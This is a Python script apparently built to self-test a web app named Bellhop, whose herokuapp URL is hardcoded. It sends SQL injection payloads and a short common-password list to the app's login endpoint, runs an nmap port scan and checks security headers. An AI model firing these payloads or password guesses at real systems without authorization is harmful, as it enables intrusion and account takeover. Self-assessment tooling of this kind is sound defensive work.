import requests
import nmap
from scapy.all import IP, TCP, sr1
import threading
import time
import json
from datetime import datetime
import logging
import os
from typing import Dict, List, Tuple, Optional

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('security_test.log'),
        logging.StreamHandler()
    ]
)

class SecurityTester:
    def __init__(self, target_url: str):
        self.url = target_url
        self.domain = target_url.split("//")[-1].split("/")[0]
        self.report = {
            "sql_injection": [],
            "brute_force": [],
            "nmap_scan": [],
            "network_scan": [],
            "timestamp": datetime.now().isoformat(),
            "target_url": target_url
        }
        
        # Rate limiting settings
        self.request_delay = 1.0  # seconds between requests
        self.max_attempts = 50    # maximum attempts per test
        
        # Test payloads
        self.sql_payloads = [
            "' OR '1'='1", 
            "' OR '1'='1' --", 
            "') OR ('1'='1", 
            "admin' --",
            "' UNION SELECT NULL--",
            "' OR '1'='1' #"
        ]
        
        self.password_list = [
            "password", "123456", "admin123", 
            "letmein", "qwerty", "welcome",
            "administrator", "default"
        ]

    def make_request(self, method: str, endpoint: str, data: Dict = None) -> Optional[requests.Response]:
        """Make a rate-limited request with proper error handling"""
        try:
            time.sleep(self.request_delay)  # Rate limiting
            full_url = f"{self.url}/{endpoint.lstrip('/')}"
            response = requests.request(method, full_url, json=data, timeout=10)
            return response
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed: {str(e)}")
            return None

    def sql_injection_test(self) -> None:
        """Test for SQL injection vulnerabilities"""
        logging.info("Starting SQL Injection Testing...")
        
        for payload in self.sql_payloads[:self.max_attempts]:
            data = {"username": payload, "password": "test"}
            response = self.make_request("POST", "api/login", data)
            
            if response:
                result = {
                    "payload": payload,
                    "status_code": response.status_code,
                    "response_length": len(response.text),
                    "timestamp": datetime.now().isoformat()
                }
                
                if response.status_code == 200:
                    logging.warning(f"[SQL Injection] Possible vulnerability: {payload}")
                    result["vulnerability_detected"] = True
                else:
                    result["vulnerability_detected"] = False
                
                self.report["sql_injection"].append(result)

    def brute_force_test(self) -> None:
        """Test for weak password vulnerabilities"""
        logging.info("Starting Brute Force Testing...")
        username = "admin"  # Test account
        
        for password in self.password_list[:self.max_attempts]:
            data = {"username": username, "password": password}
            response = self.make_request("POST", "api/login", data)
            
            if response:
                result = {
                    "username": username,
                    "password_tested": password,
                    "status_code": response.status_code,
                    "timestamp": datetime.now().isoformat()
                }
                
                if response.status_code == 200:
                    logging.critical(f"[Brute Force] Success: {username}:{password}")
                    result["success"] = True
                    self.report["brute_force"].append(result)
                    break
                else:
                    result["success"] = False
                    self.report["brute_force"].append(result)

    def nmap_scan(self) -> None:
        """Perform a basic port scan"""
        logging.info("Starting Nmap Scan...")
        scanner = nmap.PortScanner()
        
        try:
            # Using -sT for full TCP connect scan (more polite than SYN scan)
            scanner.scan(hosts=self.domain, arguments='-sT -T2 -p 80,443,8080')
            
            for host in scanner.all_hosts():
                for proto in scanner[host].all_protocols():
                    ports = scanner[host][proto].keys()
                    for port in ports:
                        state = scanner[host][proto][port]['state']
                        service = scanner[host][proto][port].get('name', 'unknown')
                        
                        result = {
                            "port": port,
                            "protocol": proto,
                            "state": state,
                            "service": service,
                            "timestamp": datetime.now().isoformat()
                        }
                        self.report["nmap_scan"].append(result)
                        logging.info(f"Port {port}/{proto}: {state} ({service})")
        except Exception as e:
            logging.error(f"Nmap scan failed: {str(e)}")

    def network_scan(self) -> None:
        """Perform basic network connectivity test"""
        logging.info("Starting Network Scan...")
        try:
            response = requests.get(f"https://{self.domain}", timeout=5)
            headers = dict(response.headers)
            
            result = {
                "status_code": response.status_code,
                "server": headers.get('Server', 'Unknown'),
                "security_headers": {
                    "Strict-Transport-Security": headers.get('Strict-Transport-Security', 'Not Set'),
                    "X-Frame-Options": headers.get('X-Frame-Options', 'Not Set'),
                    "X-Content-Type-Options": headers.get('X-Content-Type-Options', 'Not Set')
                },
                "timestamp": datetime.now().isoformat()
            }
            self.report["network_scan"].append(result)
            
        except Exception as e:
            logging.error(f"Network scan failed: {str(e)}")

    def generate_report(self) -> None:
        """Generate and save detailed security report"""
        report_file = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        # Add summary statistics
        self.report["summary"] = {
            "total_tests": sum(len(results) for results in self.report.values() if isinstance(results, list)),
            "sql_injection_attempts": len(self.report["sql_injection"]),
            "brute_force_attempts": len(self.report["brute_force"]),
            "open_ports": len([p for p in self.report["nmap_scan"] if p.get("state") == "open"])
        }
        
        # Save report to file
        with open(report_file, 'w') as f:
            json.dump(self.report, f, indent=2)
        
        logging.info(f"Report saved to {report_file}")
        self._print_report_summary()

    def _print_report_summary(self) -> None:
        """Print a human-readable summary of the security test results"""
        print("\n=== Security Test Summary ===")
        print(f"Target: {self.url}")
        print(f"Timestamp: {self.report['timestamp']}")
        print("\nTest Results:")
        
        for category, results in self.report.items():
            if isinstance(results, list) and results:
                print(f"\n[{category.upper()}]")
                if category == "sql_injection":
                    vulnerabilities = sum(1 for r in results if r.get("vulnerability_detected"))
                    print(f"Total attempts: {len(results)}")
                    print(f"Potential vulnerabilities: {vulnerabilities}")
                elif category == "brute_force":
                    successes = sum(1 for r in results if r.get("success"))
                    print(f"Total attempts: {len(results)}")
                    print(f"Successful attempts: {successes}")
                elif category == "nmap_scan":
                    open_ports = sum(1 for r in results if r.get("state") == "open")
                    print(f"Ports scanned: {len(results)}")
                    print(f"Open ports: {open_ports}")

def main():
    url = "https://bellhop-548b6104bd09.herokuapp.com"
    tester = SecurityTester(url)
    
    while True:
        print("\n=== Bellhop Security Testing Tool ===")
        print("1. SQL Injection Test")
        print("2. Brute Force Test")
        print("3. Nmap Port Scan")
        print("4. Network Security Scan")
        print("5. Run All Tests")
        print("6. Generate Report")
        print("7. Exit")
        
        try:
            choice = input("\nSelect an option (1-7): ").strip()
            
            if choice == "1":
                tester.sql_injection_test()
            elif choice == "2":
                tester.brute_force_test()
            elif choice == "3":
                tester.nmap_scan()
            elif choice == "4":
                tester.network_scan()
            elif choice == "5":
                tester.sql_injection_test()
                tester.brute_force_test()
                tester.nmap_scan()
                tester.network_scan()
                tester.generate_report()
            elif choice == "6":
                tester.generate_report()
            elif choice == "7":
                print("Exiting security testing tool.")
                break
            else:
                print("Invalid choice. Please select a valid option.")
                
        except KeyboardInterrupt:
            print("\nOperation cancelled by user.")
            break
        except Exception as e:
            logging.error(f"Unexpected error: {str(e)}")

if __name__ == "__main__":
    main()